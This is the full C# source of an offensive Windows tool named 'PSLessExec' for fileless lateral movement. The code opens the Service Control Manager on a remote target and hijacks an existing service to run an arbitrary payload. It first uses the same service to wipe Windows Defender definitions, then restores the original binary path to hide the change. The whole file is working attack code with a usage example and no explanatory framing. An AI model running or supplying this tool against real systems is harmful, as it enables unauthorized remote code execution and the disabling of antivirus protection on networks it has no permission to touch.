using System;
using System.Runtime.InteropServices;

namespace FilelessLateralMovement
{
    public class Program
    {
        public static uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        public static uint SERVICE_ALL_ACCESS = 0xF01FF;
        public static uint SERVICE_DEMAND_START = 0x3;
        public static uint SERVICE_NO_CHANGE = 0xffffffff;

        [StructLayout(LayoutKind.Sequential)]
        public class QUERY_SERVICE_CONFIG
        {
            public UInt32 dwServiceType;
            public UInt32 dwStartType;
            public UInt32 dwErrorControl;
            public string lpBinaryPathName;
            public string lpLoadOrderGroup;
            public UInt32 dwTagID;
            public string lpDependencies;
            public string lpServiceStartName;
            public string lpDisplayName;
        }

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, uint cbBufSize, out uint pcbBytesNeeded);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ChangeServiceConfig(IntPtr hService, uint dwServiceType, uint dwStartType, int dwErrorControl,
            string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies,
            string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        public static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: PSLessExec.exe [Target] [Service] [BinaryToRun] [--skip-defender (optional)]");
                Console.WriteLine("Example: PSLessExec.exe appsrv01 SensorService notepad.exe --skip-defender");
                return;
            }

            bool skipDefender = args.Length == 4 && args[3] == "--skip-defender";

            IntPtr SCMHandle = IntPtr.Zero;
            IntPtr schService = IntPtr.Zero;
            IntPtr ptr = IntPtr.Zero;

            try
            {
                SCMHandle = OpenSCManager(args[0], null, SC_MANAGER_ALL_ACCESS);
                if (SCMHandle == IntPtr.Zero)
                    throw new Exception("Failed to open SCManager: " + Marshal.GetLastWin32Error());
                Console.WriteLine($"[+] Got handle on SCManager on {args[0]}.");

                schService = OpenService(SCMHandle, args[1], SERVICE_ALL_ACCESS);
                if (schService == IntPtr.Zero)
                    throw new Exception("Failed to open target service: " + Marshal.GetLastWin32Error());
                Console.WriteLine($"[+] Got handle on target service {args[1]}.");

                uint dwBytesNeeded;
                bool bResult = QueryServiceConfig(schService, IntPtr.Zero, 0, out dwBytesNeeded);
                ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
                bResult = QueryServiceConfig(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
                if (!bResult)
                    throw new Exception("Failed to query service config: " + Marshal.GetLastWin32Error());

                QUERY_SERVICE_CONFIG qsc = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, typeof(QUERY_SERVICE_CONFIG));
                string binPathOrig = qsc.lpBinaryPathName;
                Console.WriteLine($"[+] Original binary path: {binPathOrig}");

                if (!skipDefender)
                {
                    string defBypass = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
                    bResult = ChangeServiceConfig(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, defBypass, null, null, null, null, null, null);
                    Console.WriteLine($"[*] Set service to Defender bypass: {bResult}");
                    if (!bResult) Console.WriteLine("[!] Error: " + Marshal.GetLastWin32Error());

                    bResult = StartService(schService, 0, null);
                    Console.WriteLine($"[*] Started Defender bypass, result: {bResult}");
                    if (!bResult) Console.WriteLine("[!] Error: " + Marshal.GetLastWin32Error());
                }

                bResult = ChangeServiceConfig(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, args[2], null, null, null, null, null, null);
                Console.WriteLine($"[*] Set service to payload '{args[2]}', result: {bResult}");
                if (!bResult) Console.WriteLine("[!] Error: " + Marshal.GetLastWin32Error());

                bResult = StartService(schService, 0, null);
                Console.WriteLine($"[*] Started payload, result: {bResult}");
                if (!bResult) Console.WriteLine("[!] Error: " + Marshal.GetLastWin32Error());

                bResult = ChangeServiceConfig(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, binPathOrig, null, null, null, null, null, null);
                Console.WriteLine($"[*] Restored original binary path, result: {bResult}");
                if (!bResult) Console.WriteLine("[!] Error: " + Marshal.GetLastWin32Error());
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[ERROR] " + ex.Message);
                Console.ResetColor();
            }
            finally
            {
                if (ptr != IntPtr.Zero)
                    Marshal.FreeHGlobal(ptr);
                if (schService != IntPtr.Zero)
                    CloseServiceHandle(schService);
                if (SCMHandle != IntPtr.Zero)
                    CloseServiceHandle(SCMHandle);
            }
        }
    }
}
